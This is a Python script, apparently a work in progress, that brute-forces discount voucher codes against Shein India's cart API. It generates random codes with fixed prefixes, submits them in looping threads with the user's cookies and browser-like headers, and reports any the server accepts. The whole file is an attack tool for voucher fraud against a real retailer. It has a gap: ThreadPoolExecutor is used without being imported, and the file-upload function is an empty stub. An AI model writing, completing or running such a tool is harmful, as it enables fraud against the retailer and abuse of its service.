import json
import requests
import time
import threading
import random
import string
from requests.adapters import HTTPAdapter

APPLY_URL = "https://www.sheinindia.in/api/cart/apply-voucher"
RESET_URL = "https://www.sheinindia.in/api/cart/reset-voucher"

_thread_local = threading.local()
WORKERS = 3
PREFIXES = ["SVD", "SVH", "SVI", "SVC"]
CODE_LENGTH = 12
CHECK_DELAY = 2

def generate_voucher():
    prefix = random.choice(PREFIXES)
    random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=CODE_LENGTH))
    return prefix + random_part

def load_cookies():
    try:
        with open("cookies.json", "r", encoding="utf-8") as f:
            raw = f.read().strip()
        try:
            cookie_dict = json.loads(raw)
            return "; ".join(f"{k}={v}" for k, v in cookie_dict.items())
        except:
            return raw
    except:
        return ""

def get_headers(cookie_string):
    return {
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://www.sheinindia.in",
        "referer": "https://www.sheinindia.in/cart",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "x-tenant-id": "SHEIN",
        "cookie": cookie_string
    }

def make_session():
    s = requests.Session()
    s.mount("https://", HTTPAdapter(pool_connections=100, pool_maxsize=100))
    return s

def get_session():
    if not hasattr(_thread_local, "session"):
        cookie_string = load_cookies()
        headers = get_headers(cookie_string)
        _thread_local.session = make_session()
        _thread_local.session.headers.update(headers)
    return _thread_local.session

def check_voucher(code):
    session = get_session()
    payload = {"voucherId": code, "device": {"client_type": "web"}}
    
    try:
        r = session.post(APPLY_URL, json=payload, timeout=10)
        if r.status_code == 200:
            try:
                data = r.json()
                if "errorMessage" in data:
                    return False
                return True
            except:
                return False
        return False
    except:
        return False

def auto_check_loop(valid_callback, update_counter):
    while True:
        code = generate_voucher()
        update_counter()
        
        if check_voucher(code):
            valid_callback(code)
        
        time.sleep(CHECK_DELAY)

def start_auto_check(valid_callback, update_counter):
    with ThreadPoolExecutor(max_workers=WORKERS) as executor:
        futures = [executor.submit(auto_check_loop, valid_callback, update_counter) for _ in range(WORKERS)]
        for future in futures:
            future.result()

# ========== FILE UPLOAD MODE (already exists) ==========
def process_vouchers(vouchers, progress_callback, valid_callback, user_id):
    # ... tera existing file processing code ...
    pass
